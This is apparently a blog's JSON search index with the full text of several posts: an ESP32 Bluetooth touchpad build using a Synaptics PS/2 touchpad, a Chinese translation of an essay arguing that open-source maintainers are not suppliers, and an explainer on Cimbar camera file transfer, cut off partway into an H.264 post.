


[{"content":"","date":"22 November 2024","externalUrl":null,"permalink":"/en/posts/","section":"","summary":"","title":"","type":"posts"},{"content":"","date":"22 November 2024","externalUrl":null,"permalink":"/en/tags/bluetooth/","section":"Tags","summary":"","title":"Bluetooth","type":"tags"},{"content":"","date":"22 November 2024","externalUrl":null,"permalink":"/en/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"22 November 2024","externalUrl":null,"permalink":"/en/tags/esp32/","section":"Tags","summary":"","title":"ESP32","type":"tags"},{"content":"","date":"22 November 2024","externalUrl":null,"permalink":"/en/","section":"Gaowan Liang's Blog","summary":"","title":"Gaowan Liang's Blog","type":"page"},{"content":"\nIntroduction # I personally enjoy compact devices, including small keyboards, mice, handheld consoles, and so on. Recently, I found the smallest scissor-switch keyboard available, which is only 7 inches in size and even has backlighting:\nI really like this keyboard, but it has one drawback: it\u0026rsquo;s still too large. Although its thickness is less than 5mm, as shown in the picture, there is still quite a bit of unused space at the front and back. It would be great if it had a touchpad as well. So, I started planning how to add one. Since the keyboard is still functional, I decided not to ruin it and instead bought a touchpad to work on first. I found the cheapest touchpad available, the TM2334, which cost only 16 yuan including shipping. This touchpad was used in Lenovo S41 laptops from 2012-2013, supports multi-touch, and has a great feel:\nThe next step was to understand how the touchpad works.\nSurprisingly, It\u0026rsquo;s PS/2 # Upon receiving the touchpad, I realized that it is a commercial product and not a module, so I couldn\u0026rsquo;t find any documentation. I started searching to see if anyone had worked with this model. To my surprise, I found some information:\nhttps://forum.level1techs.com/t/touchpad-ps-2-pinout-help/139088\nThe first post I found detailed how the author wanted to use this touchpad as a PS/2 device. They connected several test points but still couldn\u0026rsquo;t drive it using pure PS/2 methods:\nAnother user provided the pinout definition and soldered it to a PS/2 connector, but they were also unable to drive it:\nhttps://www.eevblog.com/forum/projects/usb-touchpad-synaptics-tm2334/\nThis user was quite stubborn, firmly believing that it could only be driven directly via PS/2. However, we had a different approach; we wanted to communicate via Bluetooth, so we weren\u0026rsquo;t bound by those limitations. I dug out my roommate\u0026rsquo;s D1 R32 development board, which I had borrowed during my graduation project. This board looks similar to an Arduino UNO but is powered by an ESP32, a dual-core processor with a frequency of 240MHz, supporting both WiFi and Bluetooth connections. Its performance is quite robust, making it perfect for development:\nTo connect the touchpad, we didn\u0026rsquo;t need to be as rough as the users abroad; we could simply buy a 6-pin FPC connector. The first time I did this, I lacked experience and saw options for 0.5 and 1.0 mm pitch connectors. I mistakenly thought the latter referred to the spacing of the holes and wondered why I would need such a wide connector. It turned out that 0.5 mm referred to the width of the ribbon cable, while the touchpad used a 1.0 mm ribbon. Fortunately, the connector I bought had a 0.5 mm pitch on one side and 1.0 mm on the other, so I just needed to buy a 1.0 mm connector to solder on, which was quite simple and saved me from wasting money.\nBased on the definitions provided in the previous posts, we learned the pinout for the ribbon cable:\n+3VS: This is the 3V power supply pin, labeled as “+3 Volt Supply.” It provides power to the related circuits (such as the touchpad). TP_CLK (Touchpad Clock): This is the clock signal pin for the touchpad. The clock signal is used to synchronize data transmission and reception. TP_DATA (Touchpad Data): This is the data transmission pin for the touchpad, responsible for transmitting data between the touchpad and the main controller. GND: Ground pin, providing a reference point for the electrical circuit. All current returns to this pin. SMB_CLK (SMBus Clock): This is the clock pin for the System Management Bus (SMBus). SMBus is used for communication with low-bandwidth devices, such as batteries or sensors. SMB_DATA (SMBus Data): This is the data pin for the SMBus, used for data transmission between SMBus devices. We must pay close attention to the orientation, especially the markings for pins 1 and 6. Pins 5 and 6 are used for the computer motherboard, which we won\u0026rsquo;t need. Additionally, it\u0026rsquo;s important to note that not every touchpad has the same pinout; if you plan to buy a random touchpad for modification, you\u0026rsquo;ll need to look up the relevant information online.\nUnderstanding PS/2 Basics # First, let\u0026rsquo;s cover some basic knowledge about PS/2. A standard PS/2 connector looks like this:\nThe power and ground lines are straightforward. The clock line (CLK) is used to synchronize data transmission and is controlled by either the device or the host as needed. The data line (DATA) is responsible for transmitting data bits between the host and the device. When a PS/2 device is idle, both the clock and data pins are pulled high. When the host wants to send data to the device, it pulls down both CLK and DATA to indicate a request to send data. The device can then control the CLK line to send data back to the host. Therefore, we can attach an interrupt to the clock pin, triggering a read signal on the falling edge to read signals from the PS/2 device.\nThe PS/2 data frame is structured as follows:\nStart Bit: Always 0 (LOW). Data Bits: 8 bits, with the least significant bit (LSB) sent first. Parity Bit (P): Ensures odd parity (the total number of 1s is odd). Stop Bit: Always 1 (HIGH). Now that we understand how to read data, the next step is to initialize a Synaptics touchpad.\nSynaptics, Let\u0026rsquo;s Get Started! # In fact, you can initialize a Synaptics touchpad using the standard PS/2 protocol because Synaptics touchpads are inherently PS/2 compatible devices:\nHowever, the downside is that while PS/2 mice have left and right buttons and scrolling functionality, without drivers, the Synaptics touchpad can only move up and down or left and right and use the left mouse button. This is barely functional, and anything beyond that is out of the question. As for two-finger taps being recognized as right-clicks or two-finger scrolling being recognized as scrolling, forget about it; those features simply won\u0026rsquo;t trigger. To use multi-finger gestures, you must send special initialization commands during setup. Unfortunately, there is very little information available online, but after persistent searching, I found a perfect resource that met my needs:\nhttps://github.com/delingren/synaptics_touchpad\nThe person who submitted this code did so around the same time I had this idea, in July. They implemented a driver for a wired Synaptics touchpad microcontroller, which is fantastic:\nNow, let\u0026rsquo;s use their program to explain what enhancements Synaptics has added to the PS/2 protocol.\nDuring the BIOS startup process, a standard PS/2 mouse operates as follows: the host sends a \u0026ldquo;Get Device ID\u0026rdquo; command (0xF2) and waits for a response. If a standard PS/2 mouse is connected, it will return an ACK (0xFA) and respond with the device ID 0x00. In this case, the host recognizes that the mouse indeed has a scroll wheel and continues to treat it as a standard PS/2 mouse.\nNext, we need to obtain a series of information from the Synaptics touchpad to facilitate the next steps:\nGetting Version Information:\nUse status_request(0x00, result) to obtain the touchpad version information. infoMajor: The major version number, taken from the lower 4 bits of result[2]. infoMinor: The minor version number, taken from result[0]. Getting Capability Information:\nUse status_request(0x02, result) to get the capability information of the touchpad. capExtended: Indicates whether extended features are supported, from the highest bit of result[0]. If extended features are supported, parse the following: nExtendedQueries: The number of extended queries. middleButton: Indicates whether a middle button is supported, from the 2nd bit of result[0]. fourButtons: Indicates whether four buttons are supported, from the 3rd bit of result[2]. multiFinger: Indicates whether multi-finger support is available, from the 1st bit of result[2]. palmDetect: Indicates whether palm detection is supported, from the 0th bit of result[2]. Getting Unit Information:\nUse status_request(0x08, result) to obtain the unit information of the touchpad. units_per_mm_x: The number of units per millimeter in the X direction, from result[0]. units_per_mm_y: The number of units per millimeter in the Y direction, from result[2]. Getting Clickpad Information:\nUse status_request(0x0C, result) to get the type information of the clickpad. coveredPadGest: Indicates whether covered pad gestures are supported, from the highest bit of result[0]. clickpad_type: The type of the touchpad, derived from the bits of result[0] and result[1]. clickPadInfo: An array describing the type of the touchpad. advGest: Indicates whether advanced gestures are supported, from the 3rd bit of result[0]. clearPad: Indicates whether clear pad functionality is supported, from the 2nd bit of result[0]. After gathering this information, we can configure the touchpad\u0026rsquo;s mode. It seems the author also spent considerable time figuring out how to set the touchpad\u0026rsquo;s mode and ultimately chose to reference the initialization command sequences from other projects:\n// Reference: 4.3. Mode Byte\n// For some reason, I couldn\u0026rsquo;t get the touchpad to report extended W mode packets.\n// After some research, I found the solution in the VoodooPS2 driver (a touchpad driver for Hackintosh).\n// This sequence sets absolute mode, high speed, W mode, and EW mode.\n// F5\n// E6, E6, E8, 03, E8, 00, E8, 01, E8, 01, F3, 14\n// E6, E6, E8, 00, E8, 00, E8, 00, E8, 03, F3, C8\n// F4\nIn the program, this is reflected as follows:\nTwo SETSCALE11 (set scale to 1:1, 0xE6) commands. Sending a special command 0xC5. Setting the sampling rate to 0x14. Sending two more SETSCALE11 commands. Sending a special command 0x03. Setting the sampling rate to 0xC8. Although it may not be entirely clear, this indeed enables the normal operation of the touchpad. For more details, you can refer to the Synaptics touchpad documentation: Synaptics Touchpad Documentation. However, I skimmed through it and didn\u0026rsquo;t find a corresponding method.\nRegarding W mode, the documentation states:\nWhen the Wmode bit is set to 1: The touchpad does not report gesture information. In this case, bit 2 is automatically used to report EWmode (Extended W mode). EWmode provides extended W mode functionality; in EW mode, the traditional X, Y, Z data no longer have their previous meanings and are redefined based on the EW mode packet codes. When the Wmode bit is set to 0: The touchpad reports gesture information. In this case, bit 2 indicates DisGest (Disable Gesture). If the DisGest bit is 0, it means click and swipe gesture processing is enabled. If the DisGest bit is 1, it means click and swipe gesture detection is disabled. When the DisGest bit is 1, in relative mode, the mouse packet will report the actual physical button states, while in absolute mode, the Gesture bit in the packet will always be 0 (i.e., no gesture reporting). Once initialization is complete, we only need to process the information sent by the touchpad according to the PS/2 device\u0026rsquo;s data reading method. The touchpad, as a PS/2 device, communicates with the host via the clock and data lines. When the touchpad needs to send data, it sends a synchronization signal through the clock line, and we only need to read the state of the data line on the falling edge of the clock line to obtain the complete data packet. Each data packet contains 48 bits of data, which record information such as the position, pressure, and width of fingers on the touchpad. The returned data packets mainly come in two types:\nPrimary Packet: Used to transmit basic touch information, such as the number of fingers, coordinates, pressure, etc. Byte 1 (Bits 47-40): Bit 47: Synchronization bit, usually 1. Bits 46-44: Number of fingers or other flag bits. Bits 43-40: May be used for button states, touch types, etc. Byte 2 (Bits 39-32): Z value, high 8 bits, representing pressure. Bytes 3 and 4 (Bits 31-16): X coordinate, high 16 bits. Bytes 5 and 6 (Bits 15-0): Y coordinate, high 16 bits. Extended Packet: Used to transmit more detailed information, supporting multi-finger operations, special gestures, etc. Byte 1 (Bits 47-40): Specific flag bits used to distinguish the type of extended packet. Byte 2 (Bits 39-32): Extended information, such as function codes, number of fingers, etc. Remaining Bytes: Depending on the type of extended packet, it contains different content, such as additional coordinates, gesture information, etc. To determine whether it is a primary packet or an extended packet, you can check the W mode, specifically looking at bits 2, 4, 5, and bit 26.\nBluetooth Integration # Integrating Bluetooth is quite simple; you can directly use the library available at https://github.com/T-vK/ESP32-BLE-Mouse.\nSince the ESP32 is a dual-core processor, I placed the part that processes touchpad information on core 0, while sending information via Bluetooth runs on core 1 by default. I mainly utilized the multitasking mechanism provided by FreeRTOS on the ESP32 to achieve the following goals:\nData Processing and Task Separation: Separating the touchpad data reception and processing into different tasks to enhance the system\u0026rsquo;s responsiveness and stability. Asynchronous Processing: Implementing asynchronous data transfer through tasks and queues to avoid heavy processing in interrupts. Since the touchpad sends data to the ESP32 via interrupts, the interrupt service routine byte_received receives the data and needs to pass it to a task for processing. Since only one byte can be received at a time, the six consecutive bytes must be concatenated to form a complete data packet. Once a complete data packet is received, it is sent to the mouseEventQueue using xQueueSendFromISR.\nAfter that, in the processing function, we use xQueueReceive to receive the packet from the queue, with a timeout of 10 milliseconds. Based on the contents of the packet, we determine its type and call the corresponding parsing function. If Bluetooth is already connected, the mouse event is sent via Bluetooth. This way, we achieve Bluetooth integration for the data.\nImplementing Complex Gestures and Optimization # About the Data Packets # After connecting the touchpad as required, every time a touch occurs, the touchpad sends a 6-byte data packet to the host. These packets contain information such as finger position, pressure (the pressure value reported by this touchpad corresponds to the touch area), and width. The TM2334 touchpad can detect a maximum of three fingers, so gestures involving more than three fingers cannot be recognized.\nDue to the inevitable noise in communication, packets may be lost or altered. Capturing every data frame is not critical; losing one or two frames is not a significant issue. Additionally, some packets have unique characteristics (for example, fixed bits at certain positions) that can be used for synchronization and recovery. Therefore, if an unexpected packet is received, I will continue to discard packets until resynchronization occurs. In simple terms, I check the 0th and 24th bytes of the packet to ensure that the 7th bit of the 0th byte is 1, and the 6th and 3rd bits are 0; and that the 7th and 6th bits of the 24th byte are 1, and the 3rd bit is 0. The specific reason for this is borrowed from the VooDooPS2 driver; I am not entirely clear on the details, and I don\u0026rsquo;t want to delve deeply into the documentation to find out why. I just need to know that this is the case.\nDesired Features # I mainly want to implement the following features, and once these are achieved, daily use should be problem-free:\nMouse movement Pressing the lower-left area as the left mouse button and the lower-right area as the right mouse button (to be implemented after casing; currently, it is quite difficult to press) Light taps as clicks Single-finger tap as the left mouse button Two-finger tap as the right mouse button Three-finger tap as the middle mouse button Palm rejection to avoid accidental touches Scrolling Two-finger vertical swipes for vertical scrolling Two-finger horizontal swipes for horizontal scrolling Three-finger gestures Three-finger horizontal swipes to switch applications Three-finger vertical swipes to show the desktop or return to the application Lightly tap and then move the finger to implement dragging Zooming in and out Sleep mode Among these, three-finger gestures are not natively supported by HID devices, so I may need to refer to Microsoft\u0026rsquo;s documentation (for switching applications, I will likely send Alt + Tap using the keyboard, and then send up, down, left, right commands; showing the desktop, etc.). This will be discussed later, but for now, let\u0026rsquo;s focus on the other features.\nActual Implementation # If we faithfully report finger positions in every frame, the cursor will experience a lot of jitter due to the inherent noise and instability of human fingers. To address this issue, we can implement some optimization strategies as follows:\nAveraging: Instead of reporting the finger position in every frame, I track the average of the last n frames to eliminate sudden movements. Currently, I have set this to 20 frames. A lower value increases precision, but the cursor may also jitter more.\nNoise Threshold: If the increment between two frames is below a certain threshold, it is considered a false touch. This value is empirical and needs to be determined through multiple experiments, as it varies with different touchpads. Currently, I have set this value to 0.08mm.\nSticky Finger Threshold: When a finger remains stationary, I use a higher threshold to make it feel \u0026ldquo;sticky\u0026rdquo; at first, but smoother when moving.\nFor scrolling, since the HID protocol reports using integers, even a gentle swipe can only report a value of 1 and cannot report decimals. To achieve fast and precise scrolling, the implementation is quite simple: when the finger moves slowly and the movement is small, I generate a report only every few frames, with a movement value of 1. Once the speed exceeds a certain threshold, I assume the user\u0026rsquo;s intent is to scroll quickly over a large area. In this case, I report in every frame, with the movement value proportional to the actual movement.\nFor light taps as clicks, the logic is as follows: when a finger is detected as just pressed down (the number of fingers in the previous frame is 0, and in the current frame it is not 0), I record the frame number when pressed and how many fingers were pressed. This is important because the touchpad may respond too quickly, leading to the actual pressing of three fingers while initially only recognizing one. Therefore, I need to keep track of the maximum number of fingers pressed during subsequent processing. Finally, when the finger is lifted (the number of fingers in the previous frame is not 0, and in the current frame it is 0), I check the distance moved, the duration of the press, and the contact width to see if they are all below a threshold. If they are, a click is triggered. This helps avoid false triggers from foreign objects or palm touches on the touchpad.\nThe functionality of dragging by moving after a light tap is also straightforward: it simply involves sliding within a threshold after a single-finger click. It is important to note that this should be implemented by pressing the left button first, then moving the cursor, and finally releasing the left button.\nCurrently, it is basically functional for normal daily use. This means that with just 16 yuan for the touchpad and 20 yuan for the ESP32, plus peripheral circuits not exceeding 50 yuan, you can achieve a low-cost Bluetooth touchpad.\ngaowanliang/ESP32-BLE-Touchpad An ESP32-based Bluetooth touchpad project that drives a Synaptics controller touchpad to connect to a computer or mobile phone via Bluetooth, providing mouse functionality. C\u0026#43;\u0026#43; 0 0 ","date":"22 November 2024","externalUrl":null,"permalink":"/en/posts/esp32-touchpad/","section":"","summary":"\u003cp\u003e\u003cvideo src=\"../../../posts/esp32-touchpad/video.webm\" controls=\"controls\" height=\"20%\"\u003e\u003c/video\u003e\u003c/p\u003e\n\n\n\u003ch2 class=\"relative group\"\u003eIntroduction \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eI personally enjoy compact devices, including small keyboards, mice, handheld consoles, and so on. Recently, I found the smallest scissor-switch keyboard available, which is only 7 inches in size and even has backlighting:\u003c/p\u003e","title":"Implementing a Low-Cost Bluetooth Touchpad","type":"posts"},{"content":"","date":"22 November 2024","externalUrl":null,"permalink":"/en/tags/ps/2/","section":"Tags","summary":"","title":"PS/2","type":"tags"},{"content":"","date":"22 November 2024","externalUrl":null,"permalink":"/en/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"22 November 2024","externalUrl":null,"permalink":"/en/categories/technology/","section":"Categories","summary":"","title":"Technology","type":"categories"},{"content":"","date":"22 November 2024","externalUrl":null,"permalink":"/en/tags/touchpad/","section":"Tags","summary":"","title":"Touchpad","type":"tags"},{"content":"","date":"2024年11月22日","externalUrl":null,"permalink":"/categories/%E6%8A%80%E6%9C%AF/","section":"Categories","summary":"","title":"技术","type":"categories"},{"content":"","date":"2024年11月22日","externalUrl":null,"permalink":"/tags/%E8%93%9D%E7%89%99/","section":"Tags","summary":"","title":"蓝牙","type":"tags"},{"content":"","date":"2024年11月22日","externalUrl":null,"permalink":"/tags/%E8%A7%A6%E6%91%B8%E6%9D%BF/","section":"Tags","summary":"","title":"触摸板","type":"tags"},{"content":"","date":"2024年10月24日","externalUrl":null,"permalink":"/tags/%E4%BE%9B%E5%BA%94%E5%95%86/","section":"Tags","summary":"","title":"供应商","type":"tags"},{"content":"","date":"2024年10月24日","externalUrl":null,"permalink":"/tags/%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6/","section":"Tags","summary":"","title":"开源软件","type":"tags"},{"content":" 注意： 本文为翻译文章，原文链接为 Software Maxims。 作者为 Thomas Depierre。 过去几年中，关于“软件供应链”这一概念的讨论越来越多。这些讨论从 LeftPad 事件开始，在近年来随着多起事故的发生而逐渐升级。然而，所有这些讨论忽略了一个基本问题。\n在解释这一点之前，我将首先定义供应链和供应商的通常含义，以及为什么我们将它们应用于软件领域。接着，我将解释为什么将自由和开源软件（FOSS）纳入这种定义的尝试是极其错误的。\n概念 # 在过去的几十年里，自由和开源软件（FOSS）崛起了。尤其是，它促使了代码片段的重用，以库的形式打包起来。之所以能够实现这一点，是因为围绕这一理念形成了一个庞大的基础设施生态系统。如今，几乎每种编程语言都有对应的包管理器，中央存储库负责存储元数据，帮助开发者找到库并管理其分发。\n这得益于 FOSS 许可证相当宽松的规定，允许开发者重用和重新混合这些库，而不必面对繁琐的法律和财务问题。一个现代软件项目可能会依赖数百甚至上千个库，从 OpenSSL 到测试框架或日期选择器，涵盖范围广泛的库，例如 JSON 编码/解码库，甚至包括部署操作系统的 libc。\n这种依赖生态系统中，许多依赖是传递性的（即依赖的依赖），这就是软件供应链模型所谓的项目供应链。在这种模型中，我们会发现一些管理工具，比如软件材料清单（SBOM），用于记录项目所用库的信息，包括库的来源、版本、内容哈希值等。\n什么是供应链？ # 供应链的概念并非凭空而来。在制造业中，供应链是生产某种工厂产品所需的一长串供应商。例如，生产汽车需要座椅、许多螺丝、线缆、电子元件、各种冲压金属板等。而线缆供应商需要铜、塑料、能源，以及各种机器工具。这些机器工具可能也需要其他机器工具来生产，还需要螺丝、螺栓、电子元件等……如此类推，直到你的供应链图看起来像是一团乱麻。\n然后，如果德国某个不知名的小工厂的工人病倒了，而供应链上五个级别的每个人都依赖于他们生产的某种螺栓，那我们就陷入困境了。类似的问题在 COVID-19 疫苗的生产中也曾发生过，当时供应链专家发现全球一年无法生产足够多的玻璃瓶来满足需求。\n为了避免供应链深处的任何问题导致宝贵的生产停滞，制造公司多年来付出了大量努力来与各级供应商建立关系。这种关系既深且复杂，但通常也永远不够充分——每个复杂系统都如此，不是吗？\n为什么我们现在谈论软件供应链？ # 因为公司不断发现它们产品中的大问题，并不是源于自己软件工程师写的代码。问题可能来自某个库的维护者决定停止提供该库的访问权限（如 LeftPad 事件），导致互联网的半壁江山瘫痪。\n问题也可能来自某个被广泛使用的库（如 OpenSSL 或 Log4J）被发现存在巨大的安全漏洞，使得互联网上的半数设备变得易受攻击。\n或者，有人可能与这些库的维护者交谈，说他们是来帮助的，获得访问权限后在代码中植入加密货币挖矿代码以牟取私利（这类事件数不胜数）。\n再或者，代码所有者可能决定他不喜欢某些人支持战争政权，于是他会在代码中加入破坏性代码，摧毁那些使用其代码的工程师的电脑，只要他们生活在世界的某个地区（确实发生过几次这样的事件）。\n于是，这些公司的每个人都惊觉到，他们的产品因依赖一些未知的代码而面临严重的“远程威胁”。因此，“软件供应链”这一概念应运而生，目的是定义供应链中人们——这些库的维护者——需要做什么才能成为不损害下游公司的好公民。\n这些规则涵盖了如何测试代码、如何保护代码的访问权限、如何发布版本、如何验证代码的安全性、如何组织代码的工作方式、如何保护控制代码的个人账户等内容。\n我不是供应商 # 但这里有一个小问题。我们不是供应商。编写和维护这些项目的人，我们不是供应商。我们与这些组织没有商业关系。我们是志愿者，编写代码并根据许可证将其发布到网上。是的，我们将代码放在网上供人使用。但我们从中什么都没有得到。\n更糟的是，支撑整个数字经济的许多基础库甚至连维持生活的资金都难以获得。关于这个问题，我强烈建议大家花时间阅读 Nadia Eghbal 的《桥梁与道路》报告，以了解问题的深度。虽然它是在 HeartBleed 事件之后写的，已经有点旧了，但时至今日依然具有深刻的现实意义。\n或者，如果你想要一个更有趣、更直观的解释，可以看看 XKCD 第 2347 话。\nXKCD 第 2347 话展示了一堆方块，标注为“所有现代数字基础设施”，其中一个小方块支撑着整个堆，标注为“一个从 2003 年起由内布拉斯加州某位不知名人士无偿维护的项目”。\n我们清楚这一点。因此，在这些控制库重用的许可证中，你会发现一个逐字复制的段落：\n“本软件依‘原样’提供，不提供任何形式的明示或暗示担保，包括但不限于适销性、特定用途的适用性和非侵权的担保。无论是在合同、侵权或其他行为中，作者或版权持有人在任何情况下都不对因本软件或本软件的使用或其他交易引起的任何索赔、损害或其他责任承担责任。”\n这个段落可能看起来有点法律术语化，而且确实显得很刺耳，但我可以很简单地总结它的含义。如果你使用它，我不欠你任何东西。完全没有。我们之间没有任何关系。我将它放到网上的条件是，如果你使用它，所有风险都由你承担。\n这意味着这里没有供应链，因为没有供应商。我没有向你提供你从我这里购买的东西。我们之间没有关系。我发布代码是因为我愿意。你让你的产品依赖它是你的责任。不是我的，也不是其他维护者的。我们提供的是库，而不是供应品。你不能将规则强加于我。\n老实说，我也不会接受这些规则。我几乎没有时间维护我负责的 FOSS 库，而定期的维护工作常常会让人感到筋疲力尽。\n当然，我非常愿意成为一个供应商。你希望我按某种方式工作，我也非常愿意这样做。但为了实现这一点，我得先成为一个供应商。这意味着你需要开始付钱给我。一个公平的价格，咱们可以谈判。并且使用一份不同的许可证。\n在那之前，我不是你的供应商。所以所有关于软件供应链的想法？你不是从供应商那里购买的，你是像浣熊一样在垃圾桶里翻找免费的代码。因此，我建议你把这些规则也丢进同一个垃圾桶里。记住，我不是供应商，因为\n本软件依“原样”提供。\n","date":"2024年10月24日","externalUrl":null,"permalink":"/posts/wo-bu-shi-gong-ying-shang/","section":"","summary":"这篇文章讨论了软件供应链的概念，以及为什么将自由和开源软件（FOSS）纳入这种定义的尝试是极其错误的。翻译自 \u003ca href=\"https://www.softwaremaxims.com/blog/not-a-supplier\" target=\"_blank\"\u003eSoftware Maxims\u003c/a\u003e","title":"我不是供应商","type":"posts"},{"content":"","date":"2024年10月24日","externalUrl":null,"permalink":"/categories/%E6%9D%82%E8%B0%88/","section":"Categories","summary":"","title":"杂谈","type":"categories"},{"content":"","date":"2024年10月24日","externalUrl":null,"permalink":"/tags/%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE/","section":"Tags","summary":"","title":"软件供应链","type":"tags"},{"content":"","date":"9 September 2024","externalUrl":null,"permalink":"/en/tags/cimbar/","section":"Tags","summary":"","title":"Cimbar","type":"tags"},{"content":"","date":"9 September 2024","externalUrl":null,"permalink":"/en/tags/error-correction/","section":"Tags","summary":"","title":"Error Correction","type":"tags"},{"content":"I previously shared a project that uses paper to store files — PaperBak. Recently, I discovered another project that allows file transmission using a camera — Cimbar. Let\u0026rsquo;s start with a demonstration.\nI\u0026rsquo;ve been watching \u0026ldquo;Zetsuen no Tempest\u0026rdquo; lately, and it\u0026rsquo;s quite good. By the way, I haven\u0026rsquo;t seen the \u0026ldquo;Hime cut\u0026rdquo; hairstyle used by the main character in a long time; it feels like it was popular ten years ago.\nProject link: https://github.com/sz3/libcimbar\nsz3/libcimbar Optimized implementation for color-icon-matrix barcodes C\u0026#43;\u0026#43; 4751 337 How to Use # Open https://cimbar.org/ and select the file you want to transmit. This web interface is just an HTML file, so as long as you can download it, you can use it offline. However, it seems that the browser can only handle files up to 10MB, so larger files won\u0026rsquo;t work.\nThen, use the official decoding program from https://github.com/sz3/cfc/releases to scan the generated QR code, and just wait for the progress bar to finish.\nThe transmission speed is reportedly 106KB/s, which is quite fast.\nWhat’s the Principle Behind It? # Image Hashing\nThe core of Cimbar is based on image hashing technology. Image hashing is a method of converting image content into a fixed-length hash value. In Cimbar, image hashing is implemented using a simple threshold algorithm: if a pixel is set to black, it is represented as 1; otherwise, it is 0. This 8x8 grid is ultimately encoded into a 64-bit number, read from left to right and top to bottom. Although this method is not complex, it is still very efficient.\nThe following image shows a set of symbols used for encoding, each representing 4 bits of data:\nEach symbol is spaced at least 20 bits apart in the hash space, ensuring that even if the image is blurred or interfered with, the symbols can still be clearly distinguished.\nHow to Encode? # The encoding process of Cimbar is like placing pieces of data into a large puzzle, where each piece represents several \u0026ldquo;bits\u0026rdquo; (the smallest unit of data storage in computers). Each piece not only has a pattern but also a color, allowing us to increase the encoding capacity by using different colors.\nThe simplified encoding process looks like this:\nfor each data group in file: find the next position place the corresponding piece Cimbar can encode approximately 9300 bytes of data into a 1024x1024 pixel image.\nError Correction and Interleaving # During data transmission, issues may arise, such as images becoming blurry or corrupted. To prevent these problems from affecting data integrity, Cimbar uses error correction codes (like Reed-Solomon). This is akin to adding a layer of \u0026ldquo;backup\u0026rdquo; to each puzzle piece, allowing Cimbar to recover information even if part of the data is lost.\nFor example, if we have 125 bytes of data, Cimbar will add an additional 30 bytes of error correction data. This way, even if some information is lost, we still have 30 bytes of \u0026ldquo;insurance\u0026rdquo; to recover it.\nMoreover, since image errors often cluster in adjacent areas (like a part of the image being obscured by a finger), Cimbar employs data interleaving techniques to distribute error correction blocks across different regions of the image, thereby reducing the impact of localized errors on overall decoding.\nFountain Coding # Fountain coding is one of the key components of the entire process. For files larger than 7500 bytes, Cimbar implements Fountain coding, an efficient method for segmented data transmission. Even if some data frames are lost, Cimbar can still reconstruct the original file using the received N+1 data frames.\nIts design is inspired by the image of a fountain\u0026rsquo;s water flow: you can draw water from a fountain without needing to catch every drop; as long as you collect enough water, you can fill your cup.\nIn data transmission, the basic principle of Fountain coding is to divide the original data into several small pieces, then generate countless encoded blocks (referred to as \u0026ldquo;drops\u0026rdquo;) through encoding. The receiver does not need to receive all these \u0026ldquo;drops\u0026rdquo;; as long as they receive enough encoded blocks, they can reconstruct the original data.\nThe advantages of Fountain coding include:\nThe decoder can receive data from multiple frames in any order. As long as enough frames are received, the file can be successfully decoded. The Implementation of Fountain Coding may seem complex, but its core principles are quite straightforward. Here’s a brief overview of its working steps:\nData Chunking First, the sender divides the original data into multiple equal-sized data chunks, each referred to as a \u0026ldquo;source block.\u0026rdquo;\nEncoding Generation Using a method called XOR operation, the sender can generate an infinite number of encoded blocks. Each encoded block is formed by combining several source blocks, achieved by performing XOR operations on randomly selected source blocks to create a new encoded block. Each encoded block can be viewed as a mixture of multiple source blocks.\nTransmission The sender continuously generates and sends these encoded blocks. The receiver does not need to receive all encoded blocks; they only need to receive a sufficient number of encoded blocks (usually slightly more than the number of source blocks) to begin decoding.\nDecoding The receiver collects enough encoded blocks and gradually uses the XOR inverse operation to recover the original data blocks. Each received encoded block is actually a combination of certain source blocks, so once the receiver has enough encoded blocks, they can deduce all the original blocks.\nStopping Condition The transmission can stop once the receiver has decoded all the original data blocks. Therefore, Fountain coding does not require the sender to specifically send certain encoded blocks, and the receiver does not need to receive them in order; as long as the number of encoded blocks is sufficient, the data can be restored.\nDecoding Process # Cimbar\u0026rsquo;s decoder first needs to locate the encoded tile grid within the image, followed by precise extraction through 2D image transformation. The task of the decoder is more complex than that of the encoder; it must handle issues like distortion and blurriness while also minimizing errors through image hash calculations.\nThis process determines the decoding priority based on the distance metric of the image hash, starting with the blocks that have the highest confidence and gradually completing the decoding of the entire image.\n","date":"9 September 2024","externalUrl":null,"permalink":"/en/posts/cimbar-introduction/","section":"","summary":"\u003cp\u003eI previously shared a project that uses paper to store files — PaperBak. Recently, I discovered another project that allows file transmission using a camera — Cimbar. Let\u0026rsquo;s start with a demonstration.\u003c/p\u003e","title":"File Transmission Using a Camera — Cimbar","type":"posts"},{"content":"","date":"9 September 2024","externalUrl":null,"permalink":"/en/tags/fountain-coding/","section":"Tags","summary":"","title":"Fountain Coding","type":"tags"},{"content":"","date":"2024年9月9日","externalUrl":null,"permalink":"/tags/fountain-%E7%BC%96%E7%A0%81/","section":"Tags","summary":"","title":"Fountain 编码","type":"tags"},{"content":"","date":"9 September 2024","externalUrl":null,"permalink":"/en/tags/image-hashing/","section":"Tags","summary":"","title":"Image Hashing","type":"tags"},{"content":"","date":"9 September 2024","externalUrl":null,"permalink":"/en/tags/interleaving/","section":"Tags","summary":"","title":"Interleaving","type":"tags"},{"content":"","date":"2024年9月9日","externalUrl":null,"permalink":"/tags/%E4%BA%A4%E7%BB%87%E5%A4%84%E7%90%86/","section":"Tags","summary":"","title":"交织处理","type":"tags"},{"content":"","date":"2024年9月9日","externalUrl":null,"permalink":"/tags/%E5%9B%BE%E5%83%8F%E5%93%88%E5%B8%8C/","section":"Tags","summary":"","title":"图像哈希","type":"tags"},{"content":"","date":"2024年9月9日","externalUrl":null,"permalink":"/tags/%E9%94%99%E8%AF%AF%E6%A0%A1%E6%AD%A3/","section":"Tags","summary":"","title":"错误校正","type":"tags"},{"content":"Previously, we discussed some aspects of H.264 encoding in MP4. This time, let\u0026rsquo;s delve into how H.264 achieves such high compression rates, which brings us to the concepts of intra prediction and inter prediction. After some research, I found that there might not be any other source as detailed as this one, and it contains almost no complex or difficult information—reading this is a 